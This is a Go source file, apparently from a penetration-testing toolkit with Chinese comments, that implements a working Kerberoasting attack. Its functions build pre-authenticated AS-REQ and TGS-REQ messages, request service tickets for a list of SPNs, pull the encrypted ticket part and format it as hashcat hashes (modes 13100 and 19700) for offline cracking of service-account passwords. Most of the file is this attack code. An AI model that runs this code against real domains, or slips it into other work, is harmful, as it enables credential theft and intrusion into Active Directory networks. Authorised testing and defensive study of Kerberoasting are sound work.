package kerberos

import (
	"encoding/hex"
	"fmt"
	"strings"
	"time"

	"fastsec/internal/kerberos/der"
)

// PreauthResult: 预认证 AS-REQ 结果（TGT + 会话密钥）
type PreauthResult struct {
	TGT          []byte // ticket
	SessionKey   []byte // 会话密钥（16 字节 RC4）
	SessionEtype int
	Realm        string
	CName        *PrincipalName
}

// BuildPreauthASReq: 构造带预认证的 AS-REQ（AES-256 优先，RC4 备选）
func BuildPreauthASReq(realm, user, password string, etypes []int, nonce uint32) ([]byte, error) {
	// 1) 生成预认证时间戳（AES-256 etype 18，salt=realm+user）
	salt := realm + user
	key := aesStringToKey(password, salt)
	paEncTs, err := buildPAEncTimestampAES(key, 1, time.Now()) // usage=1（MIT KDC 用 1）
	if err != nil {
		return nil, err
	}
	// PA-DATA: type=2 (PA-ENC-TIMESTAMP)，etype 18
	paData := buildPAData(2, paEncTs)
	paDataList := buildPADataList(paData)

	// 2) KDC-REQ-BODY（含 sname=krbtgt/realm，与 MIT kinit 一致）
	principal := PrincipalName{NameType: 1, Name: []string{user}}
	sname := PrincipalName{NameType: 2, Name: []string{"krbtgt", realm}}
	var etypeList []byte
	for _, e := range etypes {
		etypeList = append(etypeList, der.Integer(e)...)
	}
	body := der.Sequence(
		der.Explicit(0, der.BitString(optionsBytes(0x40000010))), // forwardable+renewable-ok
		der.Explicit(1, principal.Encode()),
		der.Explicit(2, Realm(realm)),
		der.Explicit(3, sname.Encode()),
		der.Explicit(5, KerberosTime(time.Now().Add(24*time.Hour))),
		der.Explicit(7, der.Int32(int(nonce))),
		der.Explicit(8, der.Sequence(etypeList)),
	)

	// 3) KDC-REQ（带 padata）
	kdcReq := der.Sequence(
		der.Explicit(1, der.Integer(5)),
		der.Explicit(2, der.Integer(MsgASReq)),
		der.Explicit(3, paDataList), // padata
		der.Explicit(4, body),
	)
	return der.Application(MsgASReq, kdcReq), nil
}

// ParseASRepWithKey: 解析 AS-REP 并解密 enc-part（用密码密钥）
// 返回会话密钥（用于后续 TGS-REQ）
func ParseASRepWithKey(resp []byte, password string) (*PreauthResult, error) {
	rep, err := ParseASRep(resp)
	if err != nil {
		return nil, err
	}
	if rep.EncPart == nil {
		return nil, fmt.Errorf("no enc-part")
	}
	// 用密码密钥解密 enc-part（usage=8, AS-REP enc-part）
	var plaintext []byte
	var sessionEtype int
	switch rep.EncPart.Etype {
	case EncTypeAES256:
		// AES-256: salt = realm + cname，AS-REP enc-part 用 usage 3（RFC 3962）
		salt := rep.Crealm + rep.CName.String()
		key := aesStringToKey(password, salt)
		pt, err := aesDecrypt(key, 3, rep.EncPart.Cipher)
		if err != nil {
			return nil, err
		}
		plaintext = pt
		sessionEtype = EncTypeAES256
	case EncTypeAES128:
		return nil, fmt.Errorf("AES-128 (etype 17) not yet implemented")
	case EncTypeRC4Hmac:
		key := ntlmKey(password)
		pt, err := rc4HMACDecrypt(key, 8, rep.EncPart.Cipher)
		if err != nil {
			return nil, err
		}
		plaintext = pt
		sessionEtype = EncTypeRC4Hmac
	default:
		return nil, fmt.Errorf("unsupported etype %d", rep.EncPart.Etype)
	}
	// 解析 AS-REP-ENC-PART 提取 session-key
	sessionKey, err := extractSessionKey(plaintext)
	if err != nil {
		return nil, err
	}
	return &PreauthResult{
		TGT:          rep.Ticket,
		SessionKey:   sessionKey,
		SessionEtype: sessionEtype,
		Realm:        rep.Crealm,
		CName:        rep.CName,
	}, nil
}

// extractSessionKey: 从 AS-REP-ENC-PART 明文提取 session-key
// AS-REP-ENC-PART ::= [APPLICATION 26] SEQUENCE { key[0] EncryptionKey, ... }
func extractSessionKey(plaintext []byte) ([]byte, error) {
	tlv, err := der.Parse(plaintext)
	if err != nil {
		return nil, err
	}
	// [APPLICATION 26] 的 Content 是 SEQUENCE TLV
	var seqContent []byte
	if tlv.Class == der.ClassApplication && tlv.Constructed {
		seqTLV, err := der.Parse(tlv.Content)
		if err != nil {
			return nil, err
		}
		seqContent = seqTLV.Content
	} else {
		seqContent = tlv.Content
	}
	items, err := der.ParseSeq(seqContent)
	if err != nil {
		return nil, err
	}
	for _, item := range items {
		if item.Class == der.ClassContextSpecific && item.Tag == 0 {
			// key[0] 显式：Content 是 SEQUENCE TLV，先剥一层
			seqTLV, err := der.Parse(item.Content)
			if err != nil {
				continue
			}
			keyItems, err := der.ParseSeq(seqTLV.Content)
			if err != nil {
				continue
			}
			for _, ki := range keyItems {
				if ki.Class == der.ClassContextSpecific && ki.Tag == 1 {
					// keyvalue[1] 显式 OCTET STRING：再剥一层
					if inner, err := der.Parse(ki.Content); err == nil {
						return inner.Content, nil
					}
					return ki.Content, nil
				}
			}
		}
	}
	return nil, fmt.Errorf("session key not found")
}

// BuildAPReq: 构造 AP-REQ（TGS-REQ 的 padata type=1）
// 用 TGT + 会话密钥加密 Authenticator
func BuildAPReq(tgt []byte, sessionKey []byte, realm string, cname *PrincipalName, nonce uint32, cksum []byte) ([]byte, error) {
	// Authenticator ::= [APPLICATION 2] SEQUENCE（RFC 4120 §4.2.1）{
	//   authenticator-vno[0] INTEGER,
	//   crealm[1] Realm,
	//   cname[2] PrincipalName,
	//   cksum[3] Checksum OPTIONAL,
	//   cusec[4] INTEGER,
	//   ctime[5] KerberosTime }
	now := time.Now()
	authInner := der.Sequence(
		der.Explicit(0, der.Integer(5)),
		der.Explicit(1, Realm(realm)),
		der.Explicit(2, cname.Encode()),
		cksum,
		der.Explicit(4, der.Integer(0)),
		der.Explicit(5, KerberosTime(now)),
	)
	authPlain := der.Application(2, authInner)
	// 用会话密钥加密（TGS-REQ 内 AP-REQ Authenticator 用 usage 7, KRB5_KEYUSAGE_TGS_REQ_AUTH）
	authCipher, err := aesEncrypt(sessionKey, 7, authPlain)
	if err != nil {
		return nil, err
	}
	// MIT 格式：无 kvno，etype 用最短 INTEGER
	encAuth := EncryptedData{Etype: EncTypeAES256, Kvno: 0, Cipher: authCipher}

	// AP-REQ ::= [APPLICATION 14] SEQUENCE {
	//   pvno[0] INTEGER, msg-type[1] INTEGER, ap-options[2] APOptions,
	//   ticket[3] Ticket, authenticator[4] EncryptedData }
	apReq := der.Sequence(
		der.Explicit(0, der.Integer(5)),
		der.Explicit(1, der.Integer(MsgAPReq)),
		der.Explicit(2, der.BitString(optionsBytes(0))),
		der.Explicit(3, tgt),
		der.Explicit(4, encAuth.Encode()),
	)
	return der.Application(MsgAPReq, apReq), nil
}

// BuildTGSReq: 构造 TGS-REQ（Kerberoast 用，请求 SPN 服务票据）
func BuildTGSReq(realm, spn string, preauth *PreauthResult, etypes []int, nonce uint32) ([]byte, error) {
	// 1) KDC-REQ-BODY：sname = SPN
	spnParts := strings.SplitN(spn, "/", 2)
	sname := PrincipalName{NameType: 2}
	if len(spnParts) >= 2 {
		sname.Name = append(sname.Name, spnParts[0], spnParts[1])
	} else {
		sname.Name = append(sname.Name, spn)
	}
	var etypeList []byte
	for _, e := range etypes {
		etypeList = append(etypeList, der.Integer(e)...)
	}
	body := der.Sequence(
		der.Explicit(0, der.BitString(optionsBytes(0))),
		der.Explicit(2, Realm(realm)),
		der.Explicit(3, sname.Encode()),
		der.Explicit(5, KerberosTime(time.Now().Add(24*time.Hour))),
		der.Explicit(7, der.Int32(int(nonce))),
		der.Explicit(8, der.Sequence(etypeList)),
	)

	// 2) cksum（MIT 用 cksumtype 16 = hmac-sha1）
	//    Checksum ::= SEQUENCE { cksumtype[0] INTEGER, checksum[1] OCTET STRING }
	cksumVal := aesChecksum(preauth.SessionKey, 6, body)
	cksum := der.Sequence(
		der.Explicit(0, der.Integer(16)),
		der.Explicit(1, der.OctetString(cksumVal)),
	)
	cksumField := der.Explicit(3, cksum) // [3] Checksum

	// 3) AP-REQ（padata type=1），带 cksum
	apReq, err := BuildAPReq(preauth.TGT, preauth.SessionKey, preauth.Realm, preauth.CName, nonce, cksumField)
	if err != nil {
		return nil, err
	}
	paData := buildPAData(1, apReq)
	paDataList := buildPADataList(paData)

	// 4) KDC-REQ
	kdcReq := der.Sequence(
		der.Explicit(1, der.Integer(5)),
		der.Explicit(2, der.Integer(MsgTGSReq)),
		der.Explicit(3, paDataList),
		der.Explicit(4, body),
	)
	return der.Application(MsgTGSReq, kdcReq), nil
}

// KerberoastUser: 对单个 SPN 做 Kerberoast
// 需要有效凭据（密码）
func KerberoastUser(kdc string, port int, realm, user, password, spn string, timeout time.Duration) (string, error) {
	// 1) 预认证 AS-REQ 拿 TGT
	nonce1 := uint32(time.Now().UnixNano() & 0xffffffff)
	req, err := BuildPreauthASReq(realm, user, password,
		[]int{EncTypeAES256}, nonce1)
	if err != nil {
		return "", err
	}
	resp, err := SendKDC(kdc, port, req, timeout)
	if err != nil {
		return "", err
	}
	preauth, err := ParseASRepWithKey(resp, password)
	if err != nil {
		return "", err
	}

	// 2) TGS-REQ 请求 SPN 票据
	nonce2 := uint32(time.Now().UnixNano() & 0xffffffff)
	tgsReq, err := BuildTGSReq(realm, spn, preauth,
		[]int{EncTypeAES256}, nonce2)
	if err != nil {
		return "", err
	}
	tgsResp, err := SendKDC(kdc, port, tgsReq, timeout)
	if err != nil {
		return "", err
	}

	// 3) 解析 TGS-REP 提取 enc-part
	tlv, err := der.Parse(tgsResp)
	if err != nil {
		return "", err
	}
	if tlv.Class == der.ClassApplication && tlv.Tag == MsgKRBError {
		e, _ := ParseKRBError(tgsResp)
		return "", fmt.Errorf("TGS-REQ failed: code=%d text=%s", e.ErrorCode, e.EText)
	}
	if tlv.Class != der.ClassApplication || tlv.Tag != MsgTGSRep {
		return "", fmt.Errorf("unexpected response: class=%d tag=%d", tlv.Class, tlv.Tag)
	}
	items, err := der.ParseSeq(tlv.Content)
	if err != nil {
		return "", err
	}
	// 双层：KDC-REP Content 是 SEQUENCE 包 context-specific
	if len(items) == 1 && items[0].Tag == der.TagSequence {
		items, _ = der.ParseSeq(items[0].Content)
	}
	// 提取 ticket[5]（服务票据，Kerberoast 目标）
	var ticket []byte
	var encPart *EncryptedData
	for _, item := range items {
		if item.Class == der.ClassContextSpecific && item.Tag == 5 {
			ticket = item.Content
		}
		if item.Class == der.ClassContextSpecific && item.Tag == 6 {
			if e, err := DecodeEncryptedData(item.Content); err == nil {
				encPart = e
			}
		}
	}
	// Kerberoast 破解的是 ticket 内 enc-part（用服务账号密钥加密）
	// Ticket ::= [APPLICATION 1] SEQUENCE { ..., enc-part[3] EncryptedData }
	tktEnc, err := extractTicketEncPart(ticket)
	if err != nil {
		return "", err
	}
	_ = encPart // 外层 enc-part 用会话密钥加密，非破解目标

	// 4) 生成 hashcat 格式（用 ticket 的 enc-part）
	//    hashcat 用 realm || spn-name（无斜杠）重建 salt
	spnName := strings.ReplaceAll(spn, "/", "")
	cipherFull := tktEnc.Cipher
	if tktEnc.Etype == EncTypeAES256 || tktEnc.Etype == EncTypeAES128 {
		// -m 19700 (AES-256 TGS-REP): $krb5tgs$18$user$realm$checksum$cipher
		checksum := []byte{}
		body := cipherFull
		if len(cipherFull) >= 12 {
			checksum = cipherFull[len(cipherFull)-12:]
			body = cipherFull[:len(cipherFull)-12]
		}
		return fmt.Sprintf("$krb5tgs$18$%s$%s$%s$%s",
			spnName, realm, hex.EncodeToString(checksum), hex.EncodeToString(body)), nil
	}
	// -m 13100 (RC4 TGS-REP): $krb5tgs$23$*user$realm$spn*$<enc-part hex>
	return fmt.Sprintf("$krb5tgs$23$*%s$%s$%s*$%s", user, realm, spn, hex.EncodeToString(cipherFull)), nil
}

// extractTicketEncPart: 从 Ticket 提取 enc-part
// Ticket ::= [APPLICATION 1] SEQUENCE {
//   tkt-vno[0] INTEGER, realm[1] Realm, sname[2] PrincipalName,
//   enc-part[3] EncryptedData }
func extractTicketEncPart(ticket []byte) (*EncryptedData, error) {
	tlv, err := der.Parse(ticket)
	if err != nil {
		return nil, err
	}
	// [APPLICATION 1] 的 Content 是 SEQUENCE TLV
	var seqContent []byte
	if tlv.Class == der.ClassApplication {
		seqTLV, err := der.Parse(tlv.Content)
		if err != nil {
			return nil, err
		}
		seqContent = seqTLV.Content
	} else {
		seqContent = tlv.Content
	}
	items, err := der.ParseSeq(seqContent)
	if err != nil {
		return nil, err
	}
	for _, item := range items {
		if item.Class == der.ClassContextSpecific && item.Tag == 3 {
			return DecodeEncryptedData(item.Content)
		}
	}
	return nil, fmt.Errorf("no enc-part in ticket")
}

// KerberoastResult: Kerberoast 结果（SPN + 哈希配对）
type KerberoastResult struct {
	SPN  string
	Hash string
}

// Kerberoast: 对多个 SPN 做 Kerberoast（返回成功配对）
func Kerberoast(kdc string, port int, realm, user, password string, spns []string, timeout time.Duration) []KerberoastResult {
	var results []KerberoastResult
	for _, spn := range spns {
		h, err := KerberoastUser(kdc, port, realm, user, password, spn, timeout)
		if err == nil && h != "" {
			results = append(results, KerberoastResult{SPN: spn, Hash: h})
		}
	}
	return results
}

// ---------- 导出（测试） ----------

// ExtractSessionKeyExport: 导出 extractSessionKey
func ExtractSessionKeyExport(plaintext []byte) ([]byte, error) {
	return extractSessionKey(plaintext)
}
